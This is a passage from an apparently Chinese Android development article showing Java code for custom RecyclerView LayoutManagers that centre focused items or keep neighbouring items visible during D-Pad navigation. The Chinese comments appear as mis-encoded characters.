                <span class="hljs-keyword">if</span> (newState == RecyclerView.SCROLL_STATE_IDLE) {
                    <span class="hljs-keyword">if</span> (isScrollingToCenter) {
                        Logger.d(TAG, <span class="hljs-string">"Scroll finished. Resetting isScrollingToCenter to false."</span>);
                        isScrollingToCenter = <span class="hljs-literal">false</span>;
                    }
                }
            }
        };
    }

    <span class="hljs-comment">// æ•æ‰å¯¹ RecyclerView çš„å¼•ç”¨ï¼Œå¹¶æ³¨å†Œæ»šåŠ¨ç›‘å¬å™¨æ¥ç®¡ç†çŠ¶æ€</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onAttachedToWindow</span><span class="hljs-params">(RecyclerView view)</span> {
        <span class="hljs-built_in">super</span>.onAttachedToWindow(view);
        <span class="hljs-built_in">this</span>.recyclerView = view;

        <span class="hljs-comment">// æ³¨å†Œæ»šåŠ¨ç›‘å¬å™¨</span>
        view.addOnScrollListener(scrollStateListener);
    }

    <span class="hljs-comment">// ã€å…³é”®ä¿®æ”¹ 2ã€‘åœ¨ä»çª—å£åˆ†ç¦»æ—¶ç§»é™¤ç›‘å¬å™¨å¹¶æ¸…é™¤å¼•ç”¨ï¼Œé˜²æ­¢å†…å­˜æ³„æ¼</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onDetachedFromWindow</span><span class="hljs-params">(RecyclerView recyclerView, RecyclerView.Recycler recycler)</span> {
        <span class="hljs-built_in">super</span>.onDetachedFromWindow(recyclerView, recycler);

        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.recyclerView != <span class="hljs-literal">null</span>) {
            <span class="hljs-comment">// ç§»é™¤ç›‘å¬å™¨ä»¥é˜²æ­¢å†…å­˜æ³„æ¼</span>
            <span class="hljs-built_in">this</span>.recyclerView.removeOnScrollListener(scrollStateListener);
            <span class="hljs-comment">// æ¸…é™¤å¯¹ RecyclerView çš„å¼•ç”¨</span>
            <span class="hljs-built_in">this</span>.recyclerView = <span class="hljs-literal">null</span>;
        }
    }

    <span class="hljs-comment">// è®¾ç½®å¤–éƒ¨ç›‘å¬å™¨</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setOnCenterItemFocusListener</span><span class="hljs-params">(OnCenterItemFocusListener listener)</span> {
        <span class="hljs-built_in">this</span>.onCenterItemFocusListener = listener;
    }

    <span class="hljs-comment">/**
     * é‡å†™ smoothScrollToPositionï¼Œç”¨äº D-Pad å¯¼èˆªæ—¶çš„ç³»ç»Ÿè‡ªåŠ¨æ»šåŠ¨ã€‚
     */</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">smoothScrollToPosition</span><span class="hljs-params">(RecyclerView recyclerView, <span class="hljs-meta">@NonNull</span> RecyclerView.State state, <span class="hljs-type">int</span> position)</span> {
        <span class="hljs-type">CenterSmoothScroller</span> <span class="hljs-variable">smoothScroller</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CenterSmoothScroller</span>(recyclerView.getContext());
        smoothScroller.setTargetPosition(position);
        startSmoothScroll(smoothScroller);
    }

    <span class="hljs-comment">/**
     * åœ¨å¸ƒå±€å®Œæˆåï¼Œä¸ºæ‰€æœ‰å¯è§ Item è®¾ç½®åŒ…è£…å™¨ç„¦ç‚¹ç›‘å¬å™¨ã€‚
     */</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onLayoutCompleted</span><span class="hljs-params">(RecyclerView.State state)</span> {
        <span class="hljs-built_in">super</span>.onLayoutCompleted(state);
        <span class="hljs-comment">// ä¸ºæ‰€æœ‰å¯è§ Item è®¾ç½®ç„¦ç‚¹ç›‘å¬å™¨</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; getChildCount(); i++) {
            <span class="hljs-type">View</span> <span class="hljs-variable">child</span> <span class="hljs-operator">=</span> getChildAt(i);
            <span class="hljs-keyword">if</span> (child == <span class="hljs-literal">null</span>) <span class="hljs-keyword">continue</span>;

            View.<span class="hljs-type">OnFocusChangeListener</span> <span class="hljs-variable">existingListener</span> <span class="hljs-operator">=</span> child.getOnFocusChangeListener();

            <span class="hljs-comment">// æ£€æŸ¥ Item ä¸Šå½“å‰çš„ç›‘å¬å™¨æ˜¯å¦å·²ç»æ˜¯æˆ‘ä»¬çš„åŒ…è£…å™¨</span>
            <span class="hljs-keyword">if</span> (!(existingListener <span class="hljs-keyword">instanceof</span> WrappingFocusChangeListener)) {
                <span class="hljs-comment">// å¦‚æœä¸æ˜¯æˆ‘ä»¬çš„åŒ…è£…å™¨ï¼Œåˆ™åˆ›å»ºæ–°çš„åŒ…è£…å™¨å¹¶è®¾ç½®</span>
                <span class="hljs-type">WrappingFocusChangeListener</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WrappingFocusChangeListener</span>(<span class="hljs-built_in">this</span>);
                <span class="hljs-comment">// å­˜å‚¨ Item ä¸Šå¯èƒ½å·²æœ‰çš„ç›‘å¬å™¨ (é€šå¸¸ç”± Adapter è®¾ç½®)ï¼Œä½¿å…¶ä¸å¤±æ•ˆ</span>
                wrapper.setOriginalListener(existingListener);
                child.setOnFocusChangeListener(wrapper);
            }

            <span class="hljs-comment">// é¦–æ¬¡å¸ƒå±€å®Œæˆæ—¶ï¼Œå¦‚æœ Item å·²ç»æœ‰ç„¦ç‚¹ï¼Œä¹Ÿå°†å…¶å¹³æ»‘æ»šåŠ¨åˆ°ä¸­å¿ƒ</span>
            <span class="hljs-keyword">if</span> (child.hasFocus()) {
                centerView(child, <span class="hljs-literal">true</span>);
            }
        }
    }

    <span class="hljs-comment">/**
     * åŒ…è£…å™¨ç„¦ç‚¹ç›‘å¬å™¨ã€‚
     * ä½œç”¨æ˜¯å…ˆæ‰§è¡Œå±…ä¸­é€»è¾‘ï¼Œç„¶åè°ƒç”¨åŸå§‹å¯èƒ½å­˜åœ¨çš„ç›‘å¬å™¨ã€‚
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WrappingFocusChangeListener</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">View</span>.OnFocusChangeListener {
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> CenterLayoutManager layoutManager;
        <span class="hljs-keyword">private</span> View.OnFocusChangeListener originalListener;

        <span class="hljs-keyword">public</span> <span class="hljs-title function_">WrappingFocusChangeListener</span><span class="hljs-params">(CenterLayoutManager lm)</span> {
            <span class="hljs-built_in">this</span>.layoutManager = lm;
        }

        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setOriginalListener</span><span class="hljs-params">(View.OnFocusChangeListener original)</span> {
            <span class="hljs-built_in">this</span>.originalListener = original;
        }

        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onFocusChange</span><span class="hljs-params">(View view, <span class="hljs-type">boolean</span> hasFocus)</span> {
            <span class="hljs-keyword">if</span> (hasFocus) {
                <span class="hljs-comment">// ã€é€’å½’é˜»æ–­ã€‘å¦‚æœæ­£åœ¨æ‰§è¡Œæ»šåŠ¨åˆ°ä¸­å¿ƒçš„æ“ä½œï¼Œåˆ™è·³è¿‡å†æ¬¡è°ƒç”¨ centerView</span>
                <span class="hljs-keyword">if</span> (layoutManager.isScrollingToCenter) {
                    Logger.d(TAG, <span class="hljs-string">"Focus change ignored due to active scrolling."</span>);
                    <span class="hljs-comment">// å…è®¸åŸå§‹ç›‘å¬å™¨ç»§ç»­æ‰§è¡Œï¼Œç„¶åé€€å‡º</span>
                    <span class="hljs-keyword">if</span> (originalListener != <span class="hljs-literal">null</span>) {
                        originalListener.onFocusChange(view, hasFocus);
                    }
                    <span class="hljs-keyword">return</span>;
                }

                <span class="hljs-comment">// 1. æ‰§è¡Œå±…ä¸­é€»è¾‘ (ä½¿ç”¨å¹³æ»‘æ»šåŠ¨)</span>
                layoutManager.centerView(view, <span class="hljs-literal">true</span>);

                <span class="hljs-comment">// 2. é€šçŸ¥ LayoutManager å¤–éƒ¨ç›‘å¬å™¨ (å¦‚æœå­˜åœ¨)</span>
                <span class="hljs-type">int</span> <span class="hljs-variable">position</span> <span class="hljs-operator">=</span> layoutManager.getPosition(view);
                <span class="hljs-keyword">if</span> (position != RecyclerView.NO_POSITION &amp;&amp; layoutManager.onCenterItemFocusListener != <span class="hljs-literal">null</span>) {
                    layoutManager.onCenterItemFocusListener.onFocus(position);
                }
            }

            <span class="hljs-comment">// 3. è°ƒç”¨åŸå§‹ç›‘å¬å™¨ (å¦‚æœå­˜åœ¨ï¼Œæ— è®ºæ˜¯å¦å±…ä¸­ï¼Œéƒ½ä¼šè°ƒç”¨)</span>
            <span class="hljs-keyword">if</span> (originalListener != <span class="hljs-literal">null</span>) {
                originalListener.onFocusChange(view, hasFocus);
            }
        }
    }

    <span class="hljs-comment">/**
     * å°†ç»™å®šçš„ View (Item) æ»šåŠ¨åˆ° RecyclerView çš„ä¸­å¿ƒã€‚
     * <span class="hljs-doctag">@param</span> child è·å¾—ç„¦ç‚¹çš„ Item View
     * <span class="hljs-doctag">@param</span> smooth æ˜¯å¦å¹³æ»‘æ»šåŠ¨
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">centerView</span><span class="hljs-params">(View child, <span class="hljs-type">boolean</span> smooth)</span> {
        <span class="hljs-keyword">if</span> (recyclerView == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span>;

        <span class="hljs-type">int</span> <span class="hljs-variable">delta</span> <span class="hljs-operator">=</span> calculateScrollDelta(child);

        <span class="hljs-comment">// å¦‚æœ delta ä¸º 0ï¼Œè¯´æ˜ View å·²ç»å±…ä¸­ï¼Œæ— éœ€æ»šåŠ¨</span>
        <span class="hljs-keyword">if</span> (delta == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span>;

        <span class="hljs-comment">// åœ¨å‘èµ·æ»šåŠ¨ä¹‹å‰ï¼Œè®¾ç½®ä¿æŠ¤æ ‡å¿—</span>
        isScrollingToCenter = <span class="hljs-literal">true</span>;
        Logger.d(TAG, <span class="hljs-string">"Starting scroll, setting isScrollingToCenter to true. Delta: "</span> + delta);


        <span class="hljs-keyword">if</span> (smooth) {
            <span class="hljs-comment">// å¹³æ»‘æ»šåŠ¨ï¼šä¾èµ– OnScrollListener æ¥é‡ç½® isScrollingToCenter</span>
            <span class="hljs-keyword">if</span> (getOrientation() == HORIZONTAL) {
                recyclerView.smoothScrollBy(delta, <span class="hljs-number">0</span>);
            } <span class="hljs-keyword">else</span> {
                recyclerView.smoothScrollBy(<span class="hljs-number">0</span>, delta);
            }
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// ç«‹å³æ»šåŠ¨ï¼šåŒæ­¥æ“ä½œï¼Œå¯ä»¥ç«‹å³é‡ç½®æ ‡å¿—</span>
            <span class="hljs-keyword">if</span> (getOrientation() == HORIZONTAL) {
                recyclerView.scrollBy(delta, <span class="hljs-number">0</span>);
            } <span class="hljs-keyword">else</span> {
                recyclerView.scrollBy(<span class="hljs-number">0</span>, delta);
            }
            isScrollingToCenter = <span class="hljs-literal">false</span>;
        }
    }

    <span class="hljs-comment">/**
     * è®¡ç®—è¦å°† View æ»šåŠ¨åˆ°ä¸­å¿ƒæ‰€éœ€çš„è·ç¦» (Delta)ã€‚
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-title function_">calculateScrollDelta</span><span class="hljs-params">(View child)</span> {
        <span class="hljs-keyword">if</span> (getOrientation() == HORIZONTAL) {
            <span class="hljs-comment">// æ°´å¹³å±…ä¸­æ»šåŠ¨è·ç¦» = Item å·¦ä¾§ä½ç½® - (RecyclerView å®½åº¦ - Item å®½åº¦) / 2</span>
            <span class="hljs-keyword">return</span> child.getLeft() - (getWidth() - child.getWidth()) / <span class="hljs-number">2</span>;
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// å‚ç›´å±…ä¸­æ»šåŠ¨è·ç¦» = Item é¡¶éƒ¨ä½ç½® - (RecyclerView é«˜åº¦ - Item é«˜åº¦) / 2</span>
            <span class="hljs-keyword">return</span> child.getTop() - (getHeight() - child.getHeight()) / <span class="hljs-number">2</span>;
        }
    }

    <span class="hljs-comment">/**
     * è‡ªå®šä¹‰çš„å¹³æ»‘æ»šåŠ¨å™¨ï¼Œç”¨äºç¡®ä¿æ»šåŠ¨ç›®æ ‡æ˜¯ä¸­å¿ƒä½ç½® (ç”¨äºD-Padå¯¼èˆª)ã€‚
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CenterSmoothScroller</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">LinearSmoothScroller</span> {

        <span class="hljs-keyword">public</span> <span class="hljs-title function_">CenterSmoothScroller</span><span class="hljs-params">(Context context)</span> {
            <span class="hljs-built_in">super</span>(context);
        }

        <span class="hljs-comment">// ç¡®å®šæ»šåŠ¨é€Ÿåº¦</span>
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">protected</span> <span class="hljs-type">float</span> <span class="hljs-title function_">calculateSpeedPerPixel</span><span class="hljs-params">(DisplayMetrics displayMetrics)</span> {
            <span class="hljs-comment">// è¿”å›ä¸€ä¸ªè¾ƒå°çš„æ•°å€¼ï¼Œå®ç°æ›´æ…¢ã€æ›´å¹³æ»‘çš„æ»šåŠ¨æ•ˆæœ</span>
            <span class="hljs-keyword">return</span> <span class="hljs-number">80f</span> / displayMetrics.densityDpi;
        }

        <span class="hljs-comment">// è®¡ç®—ç›®æ ‡ Item éœ€è¦åœé çš„ä½ç½®</span>
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">calculateDxToMakeVisible</span><span class="hljs-params">(View view, <span class="hljs-type">int</span> snapPreference)</span> {
            <span class="hljs-comment">// å¼ºåˆ¶è¿”å›æ»šåŠ¨åˆ°ä¸­å¿ƒä½ç½®çš„è·ç¦»</span>
            <span class="hljs-keyword">return</span> calculateScrollDelta(view);
        }

        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">calculateDyToMakeVisible</span><span class="hljs-params">(View view, <span class="hljs-type">int</span> snapPreference)</span> {
            <span class="hljs-comment">// å¼ºåˆ¶è¿”å›æ»šåŠ¨åˆ°ä¸­å¿ƒä½ç½®çš„è·ç¦»</span>
            <span class="hljs-keyword">return</span> calculateScrollDelta(view);
        }

        <span class="hljs-comment">// ç¡®å®šæ»šåŠ¨ç»“æŸæ—¶çš„ä½ç½®</span>
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onTargetFound</span><span class="hljs-params">(View targetView, RecyclerView.State state, Action action)</span> {
            <span class="hljs-type">int</span> <span class="hljs-variable">delta</span> <span class="hljs-operator">=</span> calculateScrollDelta(targetView);

            <span class="hljs-type">int</span> <span class="hljs-variable">dx</span> <span class="hljs-operator">=</span> (getOrientation() == HORIZONTAL) ? delta : <span class="hljs-number">0</span>;
            <span class="hljs-type">int</span> <span class="hljs-variable">dy</span> <span class="hljs-operator">=</span> (getOrientation() == VERTICAL) ? delta : <span class="hljs-number">0</span>;

            <span class="hljs-comment">// æ‰§è¡Œæ»šåŠ¨ï¼Œä½¿ç”¨ DecelerateInterpolator ä½¿å…¶æ›´å¹³æ»‘</span>
            <span class="hljs-type">int</span> <span class="hljs-variable">time</span> <span class="hljs-operator">=</span> calculateTimeForDeceleration(delta);
            action.update(dx, dy, time, <span class="hljs-keyword">new</span> <span class="hljs-title class_">DecelerateInterpolator</span>());
        }
    }
}
</code></pre>
<h4 data-id="heading-9">èšç„¦ItemViewåŠç›¸é‚»Viewéœ²å‡º</h4>
<p>ä¸å¯èƒ½æ‰€æœ‰çš„éœ€æ±‚éƒ½ä¼šè®©ä½ å±…ä¸­ï¼Œå¦å¤–ä¸€ç§éœ€æ±‚æ˜¯ï¼Œèšç„¦çš„Viewå°½å¯èƒ½å‘ä¸Šç§»åŠ¨ï¼Œæ¼å‡ºç›¸é‚»çš„Viewï¼Œé‚£ä¹ˆï¼Œæˆ‘ä»¬å®šä¹‰äº†ä¸‹é¢çš„LayoutManager</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">/**
 * EdgeVisibilityLayoutManager: ä¸“æ³¨äºè®©ç„¦ç‚¹ Item å®Œæ•´å¯è§ï¼Œ
 * ä¸”ä»…å½“ç„¦ç‚¹ Item æ˜¯å¯è§åŒºåŸŸçš„ç¬¬ä¸€ä¸ªæˆ–æœ€åä¸€ä¸ªæ—¶ï¼Œç¡®ä¿å…¶ç›¸é‚» Item å®Œæ•´éœ²å‡ºã€‚
 * * ç„¦ç‚¹ç›‘å¬å™¨ç›´æ¥åœ¨ onLayoutCompleted ä¸­è®¾ç½®ã€‚
 */</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EdgeVisibilityLayoutManager</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">LinearLayoutManager</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">isAdjustingScroll</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">TAG</span> <span class="hljs-operator">=</span> <span class="hljs-string">"EdgeVLM_InternalFocus"</span>;

    <span class="hljs-keyword">private</span> RecyclerView recyclerView;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> RecyclerView.OnScrollListener scrollStateListener;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">EdgeVisibilityLayoutManager</span><span class="hljs-params">(Context context, <span class="hljs-type">int</span> orientation, <span class="hljs-type">boolean</span> reverseLayout)</span> {
        <span class="hljs-built_in">super</span>(context, orientation, reverseLayout);

        scrollStateListener = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RecyclerView</span>.OnScrollListener() {
            <span class="hljs-meta">@Override</span>
            <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onScrollStateChanged</span><span class="hljs-params">(<span class="hljs-meta">@NonNull</span> RecyclerView recyclerView, <span class="hljs-type">int</span> newState)</span> {
                <span class="hljs-built_in">super</span>.onScrollStateChanged(recyclerView, newState);

                <span class="hljs-keyword">if</span> (newState == RecyclerView.SCROLL_STATE_IDLE) {
                    <span class="hljs-keyword">if</span> (isAdjustingScroll) {
                        Log.d(TAG, <span class="hljs-string">"Scroll adjustment finished. Resetting isAdjustingScroll to false."</span>);
                        isAdjustingScroll = <span class="hljs-literal">false</span>;
                    }
                }
            }
        };
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onAttachedToWindow</span><span class="hljs-params">(RecyclerView view)</span> {
        <span class="hljs-built_in">super</span>.onAttachedToWindow(view);
        <span class="hljs-built_in">this</span>.recyclerView = view;
        view.addOnScrollListener(scrollStateListener);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onDetachedFromWindow</span><span class="hljs-params">(RecyclerView recyclerView, RecyclerView.Recycler recycler)</span> {
        <span class="hljs-built_in">super</span>.onDetachedFromWindow(recyclerView, recycler);

        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.recyclerView != <span class="hljs-literal">null</span>) {
            <span class="hljs-built_in">this</span>.recyclerView.removeOnScrollListener(scrollStateListener);
            <span class="hljs-built_in">this</span>.recyclerView = <span class="hljs-literal">null</span>;
        }
    }

    <span class="hljs-comment">// ------------------ æ ¸å¿ƒä¿®æ”¹ï¼šåœ¨ LayoutManager ä¸­è®¾ç½®ç›‘å¬å™¨ ------------------</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onLayoutCompleted</span><span class="hljs-params">(RecyclerView.State state)</span> {
        <span class="hljs-built_in">super</span>.onLayoutCompleted(state);

        <span class="hljs-comment">// éå†æ‰€æœ‰å¯è§ Itemï¼Œè®¾ç½®å¹¶åŒ…è£…ç›‘å¬å™¨</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; getChildCount(); i++) {
            <span class="hljs-type">View</span> <span class="hljs-variable">child</span> <span class="hljs-operator">=</span> getChildAt(i);
            <span class="hljs-keyword">if</span> (child == <span class="hljs-literal">null</span>) <span class="hljs-keyword">continue</span>;

            View.<span class="hljs-type">OnFocusChangeListener</span> <span class="hljs-variable">existingListener</span> <span class="hljs-operator">=</span> child.getOnFocusChangeListener();

            <span class="hljs-comment">// ä»…å½“ Item View çš„ç›‘å¬å™¨ä¸æ˜¯æˆ‘ä»¬è‡ªå·±çš„åŒ…è£…å™¨æ—¶ï¼Œæ‰è¿›è¡Œè®¾ç½®/åŒ…è£…</span>
            <span class="hljs-keyword">if</span> (!(existingListener <span class="hljs-keyword">instanceof</span> WrappingFocusChangeListener)) {

                <span class="hljs-type">WrappingFocusChangeListener</span> <span class="hljs-variable">wrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WrappingFocusChangeListener</span>(<span class="hljs-built_in">this</span>);
                wrapper.setOriginalListener(existingListener);
                child.setOnFocusChangeListener(wrapper);
                Log.d(TAG, <span class="hljs-string">"Attached WrappingFocusChangeListener to position: "</span> + getPosition(child));
            }

            <span class="hljs-comment">// å¦‚æœ Layout å®Œæˆæ—¶ Item å·²ç»æœ‰ç„¦ç‚¹ï¼Œè§¦å‘ä¸€æ¬¡æ»šåŠ¨è°ƒæ•´</span>
            <span class="hljs-keyword">if</span> (child.hasFocus() &amp;&amp; !isAdjustingScroll) {
                adjustScrollForVisibility(child, <span class="hljs-literal">true</span>);
            }
        }
    }
    <span class="hljs-comment">// --------------------------------------------------------------------------</span>

    <span class="hljs-comment">/**
     * åŒ…è£…å™¨ï¼šç”¨äºåŒ…è£…åŸå§‹çš„ OnFocusChangeListenerï¼Œå¹¶åœ¨ç„¦ç‚¹è·å¾—æ—¶è§¦å‘æ»šåŠ¨è°ƒæ•´ã€‚
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WrappingFocusChangeListener</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">View</span>.OnFocusChangeListener {
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> EdgeVisibilityLayoutManager layoutManager;
        <span class="hljs-keyword">private</span> View.OnFocusChangeListener originalListener;

        <span class="hljs-keyword">public</span> <span class="hljs-title function_">WrappingFocusChangeListener</span><span class="hljs-params">(EdgeVisibilityLayoutManager lm)</span> {
            <span class="hljs-built_in">this</span>.layoutManager = lm;
        }

        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setOriginalListener</span><span class="hljs-params">(View.OnFocusChangeListener original)</span> {
            <span class="hljs-built_in">this</span>.originalListener = original;
        }

        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onFocusChange</span><span class="hljs-params">(View view, <span class="hljs-type">boolean</span> hasFocus)</span> {
            <span class="hljs-keyword">if</span> (hasFocus) {
                <span class="hljs-keyword">if</span> (layoutManager.isAdjustingScroll) {
                    Log.d(TAG, <span class="hljs-string">"Skipping scroll adjustment due to isAdjustingScroll=true."</span>);
                    <span class="hljs-keyword">if</span> (originalListener != <span class="hljs-literal">null</span>) {
                        originalListener.onFocusChange(view, hasFocus);
                    }
                    <span class="hljs-keyword">return</span>;
                }

                layoutManager.adjustScrollForVisibility(view, <span class="hljs-literal">true</span>);
            }

            <span class="hljs-keyword">if</span> (originalListener != <span class="hljs-literal">null</span>) {
                originalListener.onFocusChange(view, hasFocus);
            }
        }
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">adjustScrollForVisibility</span><span class="hljs-params">(View child, <span class="hljs-type">boolean</span> smooth)</span> {
        <span class="hljs-keyword">if</span> (recyclerView == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span>;

        <span class="hljs-type">int</span> <span class="hljs-variable">delta</span> <span class="hljs-operator">=</span> calculateScrollDelta(child);

        <span class="hljs-keyword">if</span> (delta == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span>;

        isAdjustingScroll = <span class="hljs-literal">true</span>;
        Log.d(TAG, <span class="hljs-string">"Starting scroll adjustment, setting isAdjustingScroll to true. Delta: "</span> + delta);

        <span class="hljs-keyword">if</span> (smooth) {
            <span class="hljs-keyword">if</span> (getOrientation() == HORIZONTAL) {
                recyclerView.smoothScrollBy(delta, <span class="hljs-number">0</span>);
            } <span class="hljs-keyword">else</span> {
                recyclerView.smoothScrollBy(<span class="hljs-number">0</span>, delta);
            }
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">if</span> (getOrientation() == HORIZONTAL) {
                recyclerView.scrollBy(delta, <span class="hljs-number">0</span>);
            } <span class="hljs-keyword">else</span> {
                recyclerView.scrollBy(<span class="hljs-number">0</span>, delta);
            }
            isAdjustingScroll = <span class="hljs-literal">false</span>;
        }
    }

    <span class="hljs-comment">/**
     * è®¡ç®—å°† View æ»šåŠ¨åˆ°è¾¹ç¼˜å¹¶éœ²å‡ºç›¸é‚»ä¸€ä¸ª Item æ‰€éœ€çš„è·ç¦» (Delta)ã€‚
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-title function_">calculateScrollDelta</span><span class="hljs-params">(View focusedChild)</span> {
        <span class="hljs-type">int</span> <span class="hljs-variable">focusedPosition</span> <span class="hljs-operator">=</span> getPosition(focusedChild);
        <span class="hljs-keyword">if</span> (focusedPosition == RecyclerView.NO_POSITION) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;

        <span class="hljs-type">int</span> <span class="hljs-variable">delta</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
        <span class="hljs-comment">// è·å–å½“å‰å¯è§åŒºåŸŸçš„ Item ä½ç½®ï¼Œç”¨äºåˆ¤æ–­æ˜¯å¦åœ¨è¾¹ç¼˜</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">firstVisiblePos</span> <span class="hljs-operator">=</span> findFirstVisibleItemPosition();
        <span class="hljs-type">int</span> <span class="hljs-variable">lastVisiblePos</span> <span class="hljs-operator">=</span> findLastVisibleItemPosition();

        <span class="hljs-keyword">if</span> (getOrientation() == HORIZONTAL) {
            <span class="hljs-type">int</span> <span class="hljs-variable">parentLeft</span> <span class="hljs-operator">=</span> getPaddingLeft();
            <span class="hljs-type">int</span> <span class="hljs-variable">parentRight</span> <span class="hljs-operator">=</span> getWidth() - getPaddingRight();
            <span class="hljs-type">int</span> <span class="hljs-variable">decoratedMeasuredWidth</span> <span class="hljs-operator">=</span> getDecoratedMeasuredWidth(focusedChild);

            <span class="hljs-comment">// ------------------ ç„¦ç‚¹ Item åœ¨å·¦ä¾§è¢«è£å‰ª (éœ€è¦å‘å·¦æ»šåŠ¨) ------------------</span>
            <span class="hljs-keyword">if</span> (getDecoratedLeft(focusedChild) &lt;= (decoratedMeasuredWidth + parentLeft)) {
                <span class="hljs-comment">// å¦‚æœå½“å‰ç„¦ç‚¹å°±æ˜¯å¯è§çš„ç¬¬ä¸€ä¸ª Itemï¼Œä¸”ä¸æ˜¯ç¬¬ä¸€é¡¹ï¼Œåˆ™ç›®æ ‡æ˜¯è®©å‰ä¸€ä¸ª Item å®Œæ•´å¯è§</span>
                <span class="hljs-keyword">if</span> (focusedPosition &gt; <span class="hljs-number">0</span>) {
                    <span class="hljs-type">View</span> <span class="hljs-variable">previousView</span> <span class="hljs-operator">=</span> findViewByPosition(focusedPosition - <span class="hljs-number">1</span>);
                    <span class="hljs-keyword">if</span> (previousView != <span class="hljs-literal">null</span>) {
                        <span class="hljs-comment">// ç›®æ ‡ï¼šå°†å‰ä¸€ä¸ª View çš„å·¦è¾¹ç¼˜å¯¹é½åˆ°çˆ¶å®¹å™¨çš„å·¦è¾¹ç¼˜</span>
                        delta = getDecoratedLeft(previousView) - parentLeft;
                        Log.d(TAG, <span class="hljs-string">"H Scroll Left: Target previous view. Delta: "</span> + delta);
                    } <span class="hljs-keyword">else</span> {
                        <span class="hljs-comment">// å¦‚æœå‰ä¸€ä¸ª View å°šæœªè¢« Layoutï¼Œåˆ™åªä¿è¯å½“å‰ View å¯è§</span>
                        delta = getDecoratedLeft(focusedChild) - parentLeft - decoratedMeasuredWidth;
                    }
                } <span class="hljs-keyword">else</span> {
                    <span class="hljs-comment">// ä¿è¯å½“å‰ View çš„å·¦è¾¹ç¼˜å¯¹é½åˆ°çˆ¶å®¹å™¨çš„å·¦è¾¹ç¼˜</span>
